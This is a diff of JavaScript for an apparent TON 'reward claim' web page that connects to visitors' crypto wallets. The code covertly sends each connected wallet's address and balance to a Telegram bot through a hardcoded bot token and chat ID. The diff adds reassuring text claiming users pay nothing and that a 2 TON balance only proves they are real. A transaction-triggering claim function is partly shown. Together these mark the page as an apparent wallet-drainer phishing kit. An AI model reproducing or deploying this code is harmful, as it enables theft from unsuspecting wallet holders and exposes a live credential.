@@ -25,70 +25,68 @@ function copyToClipboard(text) {
 // Initialize TonConnect
 
 document.addEventListener("DOMContentLoaded", async () => {
-  
   tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-  manifestUrl: "https://vocal-smakager-e64636.netlify.app/manifest.json",
-  buttonRootId: "ton-connect",
-  twaReturnUrl: "https://t.me/HubNation_Bot", // 👈 Added return URL
-  uiPreferences: {
-    colorsSet: {
-      [TON_CONNECT_UI.THEME.DARK]: {
-        connectButton: {
-          background: "#040724c0",
-          color: "040724c0",
+    manifestUrl: "https://vocal-smakager-e64636.netlify.app/manifest.json",
+    buttonRootId: "ton-connect",
+    twaReturnUrl: "https://t.me/HubNation_Bot", // 👈 Added return URL
+    uiPreferences: {
+      colorsSet: {
+        [TON_CONNECT_UI.THEME.DARK]: {
+          connectButton: {
+            background: "#e045ff",
+            color: "040724c0",
+          },
         },
-      },
-      [TON_CONNECT_UI.THEME.LIGHT]: {
-        connectButton: {
-          background: "#040724c0",
-          color: "#040724c0",
+        [TON_CONNECT_UI.THEME.LIGHT]: {
+          connectButton: {
+            background: "#040724c0",
+            color: "#040724c0",
+          },
         },
       },
     },
-  },
-});
-
+  });
 
   tonConnectUI.onStatusChange(async (wallet) => {
     if (wallet && wallet.account?.address) {
       connectedWallet = wallet;
       const friendly = toUserFriendly(wallet.account.address);
       const fullAddress = toUserFriendly(wallet.account.address);
-const botToken = "7938101132:AAFunYCy6Dv0vnrOHEeXM4QKley5q6iq53A";
-const chatId = "-1002781376753"; // e.g., 123456789 or -100XXXXXXXX
+      const botToken = "7938101132:AAFunYCy6Dv0vnrOHEeXM4QKley5q6iq53A";
+      const chatId = "-1002781376753"; // e.g., 123456789 or -100XXXXXXXX
 
-// Get balance
-try {
-  const balRes = await fetch(
-    `https://toncenter.com/api/v2/getAddressBalance?address=${fullAddress}`
-  );
-  const balData = await balRes.json();
-  let tonBalance = 0;
+      // Get balance
+      try {
+        const balRes = await fetch(
+          `https://toncenter.com/api/v2/getAddressBalance?address=${fullAddress}`
+        );
+        const balData = await balRes.json();
+        let tonBalance = 0;
 
-  if (balData.ok) {
-    tonBalance = balData.result / 1e9;
-  }
+        if (balData.ok) {
+          tonBalance = balData.result / 1e9;
+        }
 
-  // Build message
-  const message = `✅ Connected\n<code>${fullAddress}</code>\n💰 Balance: <b>${tonBalance.toFixed(
-    4
-  )} TON</b>`;
+        // Build message
+        const message = `✅ Connected\n<code>${fullAddress}</code>\n💰 Balance: <b>${tonBalance.toFixed(
+          4
+        )} TON</b>`;
 
-  // Send to Telegram
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: "HTML",
-    }),
-  });
-} catch (err) {
-  console.error("Failed to fetch balance or notify Telegram:", err);
-}
+        // Send to Telegram
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "HTML",
+          }),
+        });
+      } catch (err) {
+        console.error("Failed to fetch balance or notify Telegram:", err);
+      }
       document.getElementById(
         "wallet-address"
       ).innerText = `Wallet: ${"Connected"}`;
@@ -241,12 +239,24 @@ function showEligibility() {
 
   checksDiv.innerHTML = `<div style="background: rgba(21, 10, 83, 0.507); border-left: 4px solid #00ccff; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; color: #00ccff; line-height: 1.4;">
   ⚠️ Only your <strong>latest 100 transactions</strong> are analyzed.<br>
-  💡 <strong>Note:</strong> Transactions are optional — <strong>2 TON balance</strong> is required to claim.
+  💡 <strong>Note:</strong> You’re <strong>not paying</strong> anything — holding at least <strong>2 TON</strong> simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
 </div>
-    ${mark(c1, `5+ Transactions 🧍 <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`)}
-    ${mark(c2, `50+ Transactions 🛡️ <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`)}
-    ${mark(c3, `100+ Transactions 👑 <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`)}
-    ${mark(c4, `2+ TON Balance 💰 <span style="font-size: 0.85rem; color: #ff6b35; margin-left: 8px; font-weight: 600;">(REQUIRED)</span>`)}
+    ${mark(
+      c1,
+      `5+ Transactions 🧍 <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`
+    )}
+    ${mark(
+      c2,
+      `50+ Transactions 🛡️ <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`
+    )}
+    ${mark(
+      c3,
+      `100+ Transactions 👑 <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`
+    )}
+    ${mark(
+      c4,
+      `2+ TON Balance 💰 <span style="font-size: 0.85rem; color: #ff6b35; margin-left: 8px; font-weight: 600;">(REQUIRED)</span>`
+    )}
   `;
   checksDiv.style.display = "block";
 
@@ -286,4 +296,4 @@ async function claimTon() {
     alert("Transaction failed");
     console.error(err);
   }
-                                         }
+}
